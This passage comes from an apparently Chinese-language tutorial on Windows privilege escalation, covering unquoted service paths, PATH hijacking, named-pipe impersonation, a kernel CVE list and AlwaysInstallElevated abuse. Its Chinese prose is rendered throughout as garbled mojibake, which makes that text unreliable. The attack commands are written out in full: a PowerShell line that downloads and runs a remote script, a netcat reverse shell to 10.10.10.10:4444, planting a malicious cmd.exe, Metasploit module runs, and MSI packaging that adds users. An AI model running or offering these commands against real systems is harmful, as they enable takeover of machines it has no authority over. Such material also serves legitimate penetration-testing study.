<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>For C:<span class="se">\P</span>rogram Files<span class="se">\s</span>omething<span class="se">\l</span>egit.exe, Windows will try the following paths first:

    C:<span class="se">\P</span>rogram.exe
    C:<span class="se">\P</span>rogram Files.exe
</code></pre></div></div>
<p>å¦‚æœè¿™ç±»è·¯å¾„å¯å†™ï¼Œå³å¯åŠ«æŒè¯¥æœåŠ¡çš„ exeï¼Œå¦‚æœè¯¥æœåŠ¡å…·å¤‡é«˜æƒé™ï¼Œåˆ™å¯ææƒã€‚</p>

<p>æœç´¢æ­¤ç±»æœåŠ¡ã€‚</p>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">wmic</span> <span class="kd">service</span> <span class="kd">get</span> <span class="kd">name</span><span class="o">,</span><span class="kd">displayname</span><span class="o">,</span><span class="kd">pathname</span><span class="o">,</span><span class="kd">startmode</span> <span class="o">|</span><span class="nb">findstr</span> <span class="na">/i </span><span class="s2">"Auto"</span> <span class="o">|</span><span class="nb">findstr</span> <span class="na">/i /v </span><span class="s2">"C:\Windows\\"</span> <span class="o">|</span><span class="nb">findstr</span> <span class="na">/i /v </span><span class="s2">"""

wmic service get name,displayname,startmode,pathname | findstr /i /v "</span><span class="kd">C</span>:\Windows\\<span class="s2">" |findstr /i /v """</span>

<span class="kd">gwmi</span> <span class="na">-class </span><span class="kd">Win32_Service</span> <span class="na">-Property </span><span class="kd">Name</span><span class="o">,</span> <span class="kd">DisplayName</span><span class="o">,</span> <span class="kd">PathName</span><span class="o">,</span> <span class="kd">StartMode</span> <span class="o">|</span> <span class="kd">Where</span> <span class="o">{</span>$_.StartMode <span class="na">-eq </span><span class="s2">"Auto"</span> <span class="na">-and </span>$_.PathName <span class="na">-notlike </span><span class="s2">"C:\Windows*"</span> <span class="na">-and </span>$_.PathName <span class="na">-notlike </span><span class="s1">'"*'</span><span class="o">}</span> <span class="o">|</span> <span class="kd">select</span> <span class="kd">PathName</span><span class="o">,</span><span class="kd">DisplayName</span><span class="o">,</span><span class="kd">Name</span>
</code></pre></div></div>

<p>æ¼æ´åˆ©ç”¨ï¼š</p>
<ul>
  <li>Metasploit exploit : exploit/windows/local/trusted_service_path</li>
  <li>PowerUp exploit
    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">  </span><span class="c"># find the vulnerable application</span><span class="w">
  </span><span class="n">C:\</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">powershell.exe</span><span class="w"> </span><span class="nt">-nop</span><span class="w"> </span><span class="nt">-exec</span><span class="w"> </span><span class="nx">bypass</span><span class="w"> </span><span class="s2">"IEX (New-Object Net.WebClient).DownloadString('https://your-site.com/PowerUp.ps1'); Invoke-AllChecks"</span><span class="w">

  </span><span class="o">...</span><span class="w">
  </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Checking</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">unquoted</span><span class="w"> </span><span class="nx">service</span><span class="w"> </span><span class="nx">paths...</span><span class="w">
  </span><span class="n">ServiceName</span><span class="w">   </span><span class="p">:</span><span class="w"> </span><span class="nx">BBSvc</span><span class="w">
  </span><span class="n">Path</span><span class="w">          </span><span class="p">:</span><span class="w"> </span><span class="nx">C:\Program</span><span class="w"> </span><span class="nx">Files\Microsoft\Bing</span><span class="w"> </span><span class="nx">Bar\7.1\BBSvc.exe</span><span class="w">
  </span><span class="n">StartName</span><span class="w">     </span><span class="p">:</span><span class="w"> </span><span class="nx">LocalSystem</span><span class="w">
  </span><span class="n">AbuseFunction</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">Write-ServiceBinary</span><span class="w"> </span><span class="nt">-ServiceName</span><span class="w"> </span><span class="s1">'BBSvc'</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">HijackPath</span><span class="err">&gt;</span><span class="w">
  </span><span class="o">...</span><span class="w">

  </span><span class="c"># automatic exploit</span><span class="w">
  </span><span class="n">Invoke-ServiceAbuse</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="p">[</span><span class="n">SERVICE_NAME</span><span class="p">]</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s2">"..\..\Users\Public\nc.exe 10.10.10.10 4444 -e cmd.exe"</span><span class="w">
</span></code></pre></div>    </div>
  </li>
</ul>

<h2 id="åˆ©ç”¨-path-æ‹¦æˆªææƒ">åˆ©ç”¨ PATH æ‹¦æˆªææƒ</h2>
<p>åˆ©ç”¨æ¡ä»¶ï¼š</p>
<ul>
  <li>PATH è·¯å¾„ä¸­å­˜åœ¨å¯å†™è·¯å¾„</li>
  <li>å¯å†™æ–‡ä»¶å¤¹ä½äºåŒ…å«åˆæ³•å¯æ‰§è¡Œæ–‡ä»¶çš„æ–‡ä»¶å¤¹ä¹‹å‰ã€‚</li>
</ul>

<p>ç¤ºä¾‹ï¼š
ps ä¸­æ‰§è¡Œå¦‚ä¸‹çš„å‘½ä»¤æŸ¥çœ‹ PATH</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">Path</span><span class="w">
</span></code></pre></div></div>
<p>å‡è®¾è¾“å‡ºä¸º:<code class="language-plaintext highlighter-rouge">C:\Program Files\nodejs\;C:\WINDOWS\system32</code></p>

<p>æ£€æŸ¥ C:\Program Files\nodejs æ–‡ä»¶å¤¹çš„æƒé™å‘ç°å¯å†™ã€‚</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>icacls.exe "C:\Program Files\nodejs\"
</code></pre></div></div>
<p>ç”±äº nodejs åœ¨ system32 ä¹‹å‰ï¼Œå› æ­¤å¯ä»¥å‘ nodejs æ–‡ä»¶å¤¹ä¸­å†™å…¥ cmd.exeï¼Œä¸‹æ¬¡ç”¨æˆ·å†æ‰§è¡Œ cmd æ—¶ï¼Œåˆ™ä¼šæ‰§è¡Œ nodejs ä¸­çš„ cmd.exe</p>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">copy</span> <span class="kd">evil</span><span class="na">-file</span>.exe <span class="s2">"C:\Program Files\nodejs\cmd.exe"</span>
</code></pre></div></div>

<h2 id="åˆ©ç”¨-name-pipe-ææƒ">åˆ©ç”¨ Name Pipe ææƒ</h2>
<h3 id="åˆ©ç”¨æœåŠ¡è‡ªèº«çš„æ¼æ´æˆ–åŠŸèƒ½">åˆ©ç”¨æœåŠ¡è‡ªèº«çš„æ¼æ´æˆ–åŠŸèƒ½</h3>
<p>æ‰¾åˆ°å­˜åœ¨å‘½åç®¡é“çš„æœåŠ¡ï¼ŒæŒ–æ˜æœåŠ¡æ¼æ´æˆ–å¯ç”¨åŠŸèƒ½ï¼Œåˆ©ç”¨ Name Pipe æ“ä½œè¿™äº›åŠŸèƒ½æˆ–ç›´æ¥åˆ©ç”¨æ¼æ´è·å–åˆ°é«˜æƒé™ã€‚</p>

<p>åˆ©ç”¨æ­¥éª¤ï¼š</p>
<ol>
  <li>Find named pipes: [System.IO.Directory]::GetFiles(â€œ\.\pipe")</li>
  <li>Check named pipes DACL: pipesec.exe <named_pipe></named_pipe></li>
  <li>Reverse engineering software</li>
  <li>Send data throught the named pipe : program.exe &gt;\.\pipe\StdOutPipe 2&gt;\.\pipe\StdErrPipe</li>
</ol>

<h3 id="meterpreter-ä¸­çš„-getsystem">meterpreter ä¸­çš„ getsystem</h3>
<p>æœ‰ä»£è¡¨æ€§çš„ EXP å¦‚ meterpreter ä¸­çš„ getsystem å‘½ä»¤ã€‚è¯¥æŠ€æœ¯çš„æ ¸å¿ƒåœ¨äºå¯¹ ImpersonateNamedPipeClient API çš„åˆ©ç”¨ï¼Œé€šè¿‡å‘½åç®¡é“çš„æœåŠ¡ç«¯è¿›ç¨‹æ¨¡ä»¿å®¢æˆ·ç«¯è¿›ç¨‹çš„è®¿é—®ä»¤ç‰Œï¼Œè·å– SYSTEM æƒé™ã€‚å½“ç„¶ï¼Œæƒ³è°ƒç”¨å®ƒï¼Œå‰ææ˜¯è¿›ç¨‹å…·å¤‡ SeImpersonatePrivilege çš„æƒé™ï¼Œè€Œè¿™é€šå¸¸æ„å‘³ç€æˆ‘ä»¬å·²ç»æ˜¯ Admin ç”¨æˆ·äº†ã€‚</p>

<p>åˆ©ç”¨ç»†èŠ‚ï¼š
1) getsystem æ–°å»ºä¸€ä¸ªçº¿ç¨‹åˆ›å»ºå‘½åç®¡é“å¹¶ç­‰å¾…æœåŠ¡å‘æ¥çš„è¿æ¥ (æœåŠ¡ç«¯)
2) getsystem åˆ›å»ºäº†ä¸€ä¸ªä»¥ SYSTEM æƒé™è¿è¡Œçš„ Windows æœåŠ¡ï¼Œè¯¥æœåŠ¡ä¼šå‘å‘½åç®¡é“å‘èµ·è¿æ¥ (å®¢æˆ·ç«¯)
3) å¯åŠ¨è¯¥æœåŠ¡ï¼Œå‘ç›®æ ‡å‘½åç®¡é“å‘èµ·è¿æ¥ (å®¢æˆ·ç«¯ -&gt; æœåŠ¡ç«¯)
4) è¯¥è¿›ç¨‹(æœåŠ¡ç«¯)æ¥æ”¶è¿æ¥ï¼Œè°ƒç”¨ ImpersonateNamedPipeClientï¼Œä»è€Œæ¨¡ä»¿äº† SYSTEM æƒé™çš„è®¿é—®ä»¤ç‰Œ
5) å®Œæˆææƒè¿‡ç¨‹åï¼Œåœæ­¢å¹¶åˆ é™¤è¯¥æœåŠ¡</p>

<p>å‚è€ƒ</p>
<ul>
  <li><a href="https://www.anquanke.com/post/id/265507">èµ°è¿›Windowsä¸­çš„ææƒè¡Œä¸º-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å°</a></li>
</ul>

<h3 id="printspoofer">PrintSpoofer</h3>
<p>å‘½åç®¡é“ææƒçš„åŸç†å¤§å¤šç±»ä¼¼ï¼Œä¸€èˆ¬æ˜¯è¯±ä½¿ system æƒé™çš„æœåŠ¡è®¿é—®æˆ‘ä»¬æŒ‡å®šçš„å‘½åç®¡é“ã€‚</p>

<p>Windows çš„ MS-RPRN åè®®ç”¨äºæ‰“å°å®¢æˆ·æœºå’Œæ‰“å°æœåŠ¡å™¨ä¹‹é—´çš„é€šä¿¡ï¼Œé»˜è®¤æƒ…å†µä¸‹å¯ç”¨ã€‚åŒæ—¶ï¼ŒPrint Spooler æœåŠ¡çš„ RPC æ¥å£æš´éœ²åœ¨å‘½åç®¡é“ï¼š\.\pipe\spoolss ä¸­ï¼Œè¯¥æœåŠ¡é»˜è®¤å¼€å¯ã€‚</p>

<p>MS-RPRN åè®®å®šä¹‰çš„ RpcRemoteFindFirstPrinterChangeNotificationEx() è°ƒç”¨åˆ›å»ºä¸€ä¸ªè¿œç¨‹æ›´æ”¹é€šçŸ¥å¯¹è±¡ï¼Œè¯¥å¯¹è±¡ç›‘è§†å¯¹æ‰“å°æœºå¯¹è±¡çš„æ›´æ”¹ï¼Œå¹¶å°†æ›´æ”¹é€šçŸ¥å‘é€åˆ°æ‰“å°å®¢æˆ·ç«¯ã€‚</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">DWORD</span> <span class="n">RpcRemoteFindFirstPrinterChangeNotificationEx</span><span class="p">(</span> 
    <span class="cm">/* [in] */</span> <span class="n">PRINTER_HANDLE</span> <span class="n">hPrinter</span><span class="p">,</span>
    <span class="cm">/* [in] */</span> <span class="n">DWORD</span> <span class="n">fdwFlags</span><span class="p">,</span>
    <span class="cm">/* [in] */</span> <span class="n">DWORD</span> <span class="n">fdwOptions</span><span class="p">,</span>
    <span class="cm">/* [unique][string][in] */</span> <span class="kt">wchar_t</span> <span class="o">*</span><span class="n">pszLocalMachine</span><span class="p">,</span>
    <span class="cm">/* [in] */</span> <span class="n">DWORD</span> <span class="n">dwPrinterLocal</span><span class="p">,</span>
    <span class="cm">/* [unique][in] */</span> <span class="n">RPC_V2_NOTIFY_OPTIONS</span> <span class="o">*</span><span class="n">pOptions</span><span class="p">)</span>

</code></pre></div></div>
<p>å…¶ä¸­ pszLocalMachine æ˜¯æŒ‡å‘è¡¨ç¤ºå®¢æˆ·ç«¯è®¡ç®—æœºåç§°çš„å­—ç¬¦ä¸²çš„æŒ‡é’ˆï¼Œéœ€è¦ä¼ é€’ä¸€ä¸ª UNC è·¯å¾„ï¼Œä¼ é€’ \127.0.0.1 æ—¶ï¼ŒæœåŠ¡å™¨ä¼šè®¿é—® \127.0.0.1\pipe\spoolssï¼Œä½†è¿™ä¸ªç®¡é“å·²ç»è¢«ç³»ç»Ÿæ³¨å†Œäº†ï¼Œå¹¶ç”± NT AUTHORITY\SYSTEM æ§åˆ¶ã€‚</p>

<p>é‚£ä¹ˆä¸‹ä¸€æ­¥å°±æ˜¯è¦æƒ³åŠæ³•æŠŠè¿™ä¸ªè¯·æ±‚è®©æˆ‘ä»¬å‡†å¤‡å¥½çš„æ¶æ„ç®¡é“æ¥æ”¶ã€‚</p>

<p>è€ƒè™‘åˆ° UNC è·¯å¾„çš„æ€§è´¨ï¼Œå¦‚æœä¸»æœºååŒ…å« /ï¼Œå®ƒå°†é€šè¿‡è·¯å¾„æ£€æŸ¥ï¼Œä½†çœŸæ­£è¿æ¥çš„æ—¶å€™ä¼šè½¬åŒ–ä¸º \ ã€‚é‚£ä¹ˆï¼Œå¦‚æœä¼ é€’ä¸€ä¸ª \127.0.0.1/pipe/fooï¼Œæ£€æŸ¥æ—¶ä¼šè®¤ä¸º 127.0.0.1/pipe/foo æ˜¯ä¸€ä¸ªä¸»æœºåï¼Œéšååœ¨è¿æ¥ named pipe æ—¶ä¼šå¯¹å‚æ•°åšæ ‡å‡†åŒ–ï¼Œäºæ˜¯å°±ä¼šè¿æ¥ \127.0.0.1\pipe\foo\pipe\spoolssï¼Œé‚£ä¹ˆæ”»å‡»è€…å°±å¯ä»¥æŠŠä¸»æœºåæ”¹ä¸º \127.0.0.1/pipe/foo å¹¶æ³¨å†Œè¿™ä¸ª named pipe ä»è€Œçªƒå– client çš„ tokenã€‚</p>

<p>åˆ©ç”¨å·¥å…·ï¼š</p>
<ul>
  <li><a href="https://github.com/itm4n/PrintSpoofer">itm4n/PrintSpoofer: Abusing impersonation privileges through the â€œPrinter Bugâ€</a></li>
</ul>

<h2 id="åˆ©ç”¨å†…æ ¸æ¼æ´ææƒ">åˆ©ç”¨å†…æ ¸æ¼æ´ææƒ</h2>
<p>å¯å‚è€ƒï¼šhttps://github.com/SecWiki/windows-kernel-exploits</p>

<ul>
  <li>CVE-2021-33739 [Microsoft DWM Core Library Elevation of Privilege Vulnerability] (Windows 10, 20)</li>
  <li>CVE-2021-1732 [Windows Win32k Elevation of Privilege Vulnerability] (Windows 10, 2019/20H2)</li>
  <li>CVE-2020-0787 [Windows Background Intelligent Transfer Service Elevation of Privilege Vulnerability] (Windows 7/8/10, 2008/2012- 2016/2019)</li>
  <li>CVE-2020-0796 [A remote code execution vulnerability exists in the way that the Microsoft Server Message Block 3.1.1 (SMBv3)- protocol handles certain requests, aka â€˜Windows SMBv3 Client/Server Remote Code Execution Vulnerabilityâ€™] (Windows 1903/1909)</li>
  <li>CVE-2019-1458 [An elevation of privilege vulnerability exists in Windows when the Win32k component fails to properly handle- objects in memory] (Windows 7/8/10/2008/2012/2016)</li>
  <li>CVE-2019-0803 [An elevation of privilege vulnerability exists in Windows when the Win32k component fails to properly handle- objects in memory] (Windows 7/8/10/2008/2012/2016/2019)</li>
  <li>CVE-2018-8639 [An elevation of privilege vulnerability exists in Windows when the Win32k component fails to properly handle- objects in memory] (Windows 7/8/10/2008/2012/2016)</li>
  <li>CVE-2018-1038 [Windows Kernel Elevation of Privilege Vulnerability] (Windows 7 SP1/Windows Server 2008 R2 SP1)</li>
  <li>CVE-2018-0743 [Windows Subsystem for Linux Elevation of Privilege Vulnerability] (Windows 10 version 1703/Windows 10 version 1709- Windows Server version 1709)</li>
  <li>CVE-2018-8453 [An elevation of privilege vulnerability in Windows Win32k component] (&gt;= windows 8.1)</li>
  <li>CVE-2018-8440 [Windows ALPC Elevation of Privilege Vulnerability] (windows 7/8.1/10/2008/2012/2016)</li>
  <li>MS17-017 ã€€[KB4013081]ã€€ã€€[GDI Palette Objects Local Privilege Escalation]ã€€ã€€(windows 7/8)</li>
  <li>CVE-2017-8464 ã€€[LNK Remote Code Execution Vulnerability]ã€€ã€€(windows 10/8.1/7/2016/2010/2008)</li>
  <li>CVE-2017-0213 ã€€[Windows COM Elevation of Privilege Vulnerability]ã€€ã€€(windows 10/8.1/7/2016/2010/2008)</li>
  <li>CVE-2018-0833 [SMBv3 Null Pointer Dereference Denial of Service]  (Windows 8.1/Server 2012 R2)</li>
  <li>CVE-2018-8120 [Win32k Elevation of Privilege Vulnerability] (Windows 7 SP1/2008 SP2,2008 R2 SP1)</li>
  <li>MS17-010 ã€€[KB4013389]ã€€ã€€[Windows Kernel Mode Drivers]ã€€ã€€(windows 7/2008/2003/XP)</li>
  <li>MS16-135 ã€€[KB3199135]ã€€ã€€[Windows Kernel Mode Drivers]ã€€ã€€(2016)</li>
  <li>MS16-111 ã€€[KB3186973]ã€€ã€€[kernel api]ã€€ã€€(Windows 10 10586 (32/64)/8.1)</li>
  <li>MS16-098 ã€€[KB3178466]ã€€ã€€[Kernel Driver]ã€€ã€€(Win 8.1)</li>
  <li>MS16-075 ã€€[KB3164038]ã€€ã€€[Hot Potato]ã€€ã€€(2003/2008/7/8/2012)</li>
  <li>MS16-034 ã€€[KB3143145]ã€€ã€€[Kernel Driver]ã€€ã€€(2008/7/8/10/2012)</li>
  <li>MS16-032 ã€€[KB3143141]ã€€ã€€[Secondary Logon Handle]ã€€ã€€(2008/7/8/10/2012)</li>
  <li>MS16-016 ã€€[KB3136041]ã€€ã€€[WebDAV]ã€€ã€€(2008/Vista/7)</li>
  <li>MS16-014 ã€€[K3134228]ã€€ã€€[remote code execution]ã€€ã€€(2008/Vista/7)</li>
  <li>MS15-097 ã€€[KB3089656]ã€€ã€€[remote code execution]ã€€ã€€(win8.1/2012)</li>
  <li>MS15-076 ã€€[KB3067505]ã€€ã€€[RPC]ã€€ã€€(2003/2008/7/8/2012)</li>
  <li>MS15-077 ã€€[KB3077657]ã€€ã€€[ATM]ã€€ã€€(XP/Vista/Win7/Win8/2000/2003/2008/2012)</li>
  <li>MS15-061 ã€€[KB3057839]ã€€ã€€[Kernel Driver]ã€€ã€€(2003/2008/7/8/2012)</li>
  <li>MS15-051 ã€€[KB3057191]ã€€ã€€[Windows Kernel Mode Drivers]ã€€ã€€(2003/2008/7/8/2012)</li>
  <li>MS15-015 ã€€[KB3031432]ã€€ã€€[Kernel Driver]ã€€ã€€(Win7/8/8.1/2012/RT/2012 R2/2008 R2)</li>
  <li>MS15-010 ã€€[KB3036220]ã€€ã€€[Kernel Driver]ã€€ã€€(2003/2008/7/8)</li>
  <li>MS15-001 ã€€[KB3023266]ã€€ã€€[Kernel Driver]ã€€ã€€(2008/2012/7/8)</li>
  <li>MS14-070 ã€€[KB2989935]ã€€ã€€[Kernel Driver]ã€€ã€€(2003)</li>
  <li>MS14-068 ã€€[KB3011780]ã€€ã€€[Domain Privilege Escalation]ã€€ã€€(2003/2008/2012/7/8)</li>
  <li>MS14-058 ã€€[KB3000061]ã€€ã€€[Win32k.sys]ã€€ã€€(2003/2008/2012/7/8)</li>
  <li>MS14-066 ã€€[KB2992611]ã€€ã€€[Windows Schannel Allowing remote code execution] (VistaSP2/7 SP1/8/Windows 8.1/2003 SP2/2008 SP2/2008 R2- SP1/2012/2012 R2/Windows RT/Windows RT 8.1)</li>
  <li>MS14-040 ã€€[KB2975684]ã€€ã€€[AFD Driver]ã€€ã€€(2003/2008/2012/7/8)</li>
  <li>MS14-002 ã€€[KB2914368]ã€€ã€€[NDProxy]ã€€ã€€(2003/XP)</li>
  <li>MS13-053 ã€€[KB2850851]ã€€ã€€[win32k.sys]ã€€ã€€(XP/Vista/2003/2008/win 7)</li>
  <li>MS13-046 ã€€[KB2840221]ã€€ã€€[dxgkrnl.sys]ã€€ã€€(Vista/2003/2008/2012/7)</li>
  <li>MS13-005 ã€€[KB2778930]ã€€ã€€[Kernel Mode Driver]ã€€ã€€(2003/2008/2012/win7/8)</li>
  <li>MS12-042 ã€€[KB2972621]ã€€ã€€[Service Bus]ã€€ã€€(2008/2012/win7)</li>
  <li>MS12-020 ã€€[KB2671387]ã€€ã€€[RDP]ã€€ã€€(2003/2008/7/XP)</li>
  <li>MS11-080 ã€€[KB2592799]ã€€ã€€[AFD.sys]ã€€ã€€(2003/XP)</li>
  <li>MS11-062 ã€€[KB2566454]ã€€ã€€[NDISTAPI]ã€€ã€€(2003/XP)</li>
  <li>MS11-046 ã€€[KB2503665]ã€€ã€€[AFD.sys]ã€€ã€€(2003/2008/7/XP)</li>
  <li>MS11-011 ã€€[KB2393802]ã€€ã€€[kernel Driver]ã€€ã€€(2003/2008/7/XP/Vista)</li>
  <li>MS10-092 ã€€[KB2305420]ã€€ã€€[Task Scheduler]ã€€ã€€(2008/7)</li>
  <li>MS10-065 ã€€[KB2267960]ã€€ã€€[FastCGI]ã€€ã€€(IIS 5.1, 6.0, 7.0, and 7.5)</li>
  <li>MS10-059 ã€€[KB982799]ã€€ã€€ [ACL-Churraskito]ã€€ã€€(2008/7/Vista)</li>
  <li>MS10-048 ã€€[KB2160329]ã€€ã€€[win32k.sys]ã€€ã€€(XP SP2 &amp; SP3/2003 SP2/Vista SP1 &amp; SP2/2008 Gold &amp; SP2 &amp; R2/Win7)</li>
  <li>MS10-015 ã€€[KB977165]ã€€ã€€ [KiTrap0D]ã€€ã€€(2003/2008/7/XP)</li>
  <li>MS10-012 ã€€[KB971468]ã€€ã€€[SMB Client Trans2 stack overflow]ã€€ã€€(Windows 7/2008R2)</li>
  <li>MS09-050 ã€€[KB975517]ã€€ã€€ [Remote Code Execution]ã€€ã€€(2008/Vista)</li>
  <li>MS09-020 ã€€[KB970483]ã€€ã€€ [IIS 6.0]ã€€ã€€(IIS 5.1 and 6.0)</li>
  <li>MS09-012 ã€€[KB959454]ã€€ã€€ [Chimichurri]ã€€ã€€(Vista/win7/2008/Vista)</li>
  <li>MS08-068 ã€€[KB957097]ã€€ã€€ [Remote Code Execution]ã€€ã€€(2000/XP)</li>
  <li>MS08-067 ã€€[KB958644]ã€€ã€€ [Remote Code Execution]ã€€ã€€(Windows 2000/XP/Server 2003/Vista/Server 2008)</li>
  <li>MS08-066 ã€€[KB956803]ã€€ã€€ [AFD.sys]ã€€ã€€(Windows 2000/XP/Server 2003)</li>
  <li>MS08-025 ã€€[KB941693]ã€€ã€€ [Win32.sys]ã€€ã€€(XP/2003/2008/Vista)</li>
  <li>MS06-040 ã€€[KB921883]ã€€ã€€ [Remote Code Execution]ã€€ã€€(2003/xp/2000)</li>
  <li>MS05-039 ã€€[KB899588]ã€€ã€€ [PnP Service]ã€€ã€€(Win 9X/ME/NT/2000/XP/2003)</li>
  <li>MS03-026 ã€€[KB823980]ã€€ã€€ [Buffer Overrun In RPC Interface]ã€€ã€€(/NT/2000/XP/2003)</li>
</ul>

<h2 id="åˆ©ç”¨-microsoft-windows-installer-ææƒ">åˆ©ç”¨ Microsoft Windows Installer ææƒ</h2>
<h3 id="alwaysinstallelevated-æ³¨å†Œè¡¨é¡¹é”™è¯¯é…ç½®">AlwaysInstallElevated æ³¨å†Œè¡¨é¡¹é”™è¯¯é…ç½®</h3>

<p>windows æœ‰ä¸€ä¸ªç³»ç»Ÿè¿›ç¨‹ MSIEXECï¼Œç”¨äºå®‰è£… Windows Installer å®‰è£…åŒ…ï¼ŒAlwaysInstallElevated æ˜¯ä¸€ä¸ªç»„ç­–ç•¥é…ç½®ï¼Œå¦‚æœå¯ç”¨ï¼Œé‚£ä¹ˆå°†å…è®¸æ™®é€šç”¨æˆ·ä»¥ SYSTEM æƒé™è¿è¡Œ msi æ–‡ä»¶è¿›è¡Œå®‰è£…ã€‚å¦‚æœå¯¹æ–¹æœºå™¨æ°å¥½å¼€å¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨æ­¤ç¼ºé™·ææƒã€‚</p>

<p>æ³¨å†Œè¡¨æŸ¥è¯¢, å¦‚æœä¸¤ä¸ªæŸ¥è¯¢éƒ½è¿”å›å€¼ 0x1ï¼Œåˆ™ä¸ºç”¨æˆ·å’Œè®¡ç®—æœºå¯ç”¨äº† AlwaysInstallElevatedï¼Œè¡¨æ˜ç³»ç»Ÿå®¹æ˜“å—åˆ°æ”»å‡»ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># shell</span>
reg query HKCU<span class="se">\S</span>OFTWARE<span class="se">\P</span>olicies<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\I</span>nstaller /v AlwaysInstallElevated
reg query HKLM<span class="se">\S</span>OFTWARE<span class="se">\P</span>olicies<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\I</span>nstaller /v AlwaysInstallElevated

<span class="c"># ps</span>
Get-ItemProperty HKLM<span class="se">\S</span>oftware<span class="se">\P</span>olicies<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\I</span>nstaller
Get-ItemProperty HKCU<span class="se">\S</span>oftware<span class="se">\P</span>olicies<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\I</span>nstaller
</code></pre></div></div>

<p>æ¼æ´åˆ©ç”¨ï¼š
MSF çš„ exploit/windows/local/always_install_elevate æ¨¡å—å¯ä»¥è‡ªåŠ¨å®Œæˆææƒæ“ä½œï¼Œä¼šåˆ›å»ºä¸€ä¸ªéšæœºæ–‡ä»¶åçš„ msi æ–‡ä»¶ï¼Œå¹¶åœ¨ææƒæˆåŠŸååˆ é™¤æ­¤maiæ–‡ä»¶ï¼Œæ”»å‡»æˆåŠŸä¼šè¿”å› system æƒé™ä¼šè¯</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>getuid
use exploit/windows/local/always_install_elevated
<span class="nb">set </span>session 4
run
</code></pre></div></div>
<p>PowerUP åˆ©ç”¨
æ£€æŸ¥æ³¨å†Œè¡¨çš„è®¾ç½®ï¼š</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell</span><span class="w"> </span><span class="nt">-exec</span><span class="w"> </span><span class="nx">bypass</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s2">"&amp; {import-module .\powerup.ps1; get-registryalwaysinstallelevated}"</span><span class="w">
</span></code></pre></div></div>

<p>ç”Ÿæˆæ–°çš„è´¦æˆ·ï¼š</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell</span><span class="w"> </span><span class="nt">-exec</span><span class="w"> </span><span class="nx">bypass</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s2">"&amp; {import-module .\powerup.ps1; write-useraddmsi}"</span><span class="w">
</span></code></pre></div></div>

<p>Metasploitå¯ä»¥ç”Ÿæˆ MSI ç±»å‹çš„è½½è·ï¼Œä½†å¾ˆå®¹æ˜“è¢« AV/EDR æ‰€æ£€æµ‹ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ‰‹åŠ¨åˆ›å»º MSI åŒ…è£¹æ–‡ä»¶ã€‚
æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å·¥å…· wix (https://github.com/wixtoolset/wix3) æ¥å°†åŒ…å«äºŒè¿›åˆ¶æ–‡ä»¶æˆ–è€…ä»»æ„å‘½ä»¤çš„æ¨¡æ¿ (https://github.com/KINGSABRI/MSI-AlwaysInstallElevated) è¿›è¡Œæ‰“åŒ…ç„¶åå®‰è£…ã€‚
æˆ‘ä»¬å¯ä»¥ç›´æ¥å°†è¦è¿è¡Œçš„è½½è·æˆ–è€…å‘½ä»¤åŒ…å«åœ¨é‡Œé¢ï¼Œæˆ‘ä»¬å°è¯•æ‰§è¡Œæ·»åŠ æ–°ç”¨æˆ·çš„å‘½ä»¤ï¼Œæ¨¡æ¿å†…å®¹å¦‚ä¸‹ï¼š</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;Wix</span> <span class="na">xmlns=</span><span class="s">"http://schemas.microsoft.com/wix/2006/wi"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;Product</span> <span class="na">Id=</span><span class="s">"*"</span> <span class="na">UpgradeCode=</span><span class="s">"12345678-1234-1234-1234-111111111111"</span> <span class="na">Name=</span><span class="s">"23e23deeqwddeweqwde"</span> <span class="na">Version=</span><span class="s">"0.0.1"</span> <span class="na">Manufacturer=</span><span class="s">"Test1"</span> <span class="na">Language=</span><span class="s">"1033"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;Package</span> <span class="na">InstallerVersion=</span><span class="s">"200"</span> <span class="na">Compressed=</span><span class="s">"yes"</span> <span class="na">Comments=</span><span class="s">"Windows Installer Package"</span> <span class="nt">/&gt;</span>
        <span class="nt">&lt;Media</span> <span class="na">Id=</span><span class="s">'1'</span> <span class="nt">/&gt;</span>
        <span class="nt">&lt;Directory</span> <span class="na">Id=</span><span class="s">"TARGETDIR"</span> <span class="na">Name=</span><span class="s">"SourceDir"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;Directory</span> <span class="na">Id=</span><span class="s">"ProgramFilesFolder"</span><span class="nt">&gt;</span>
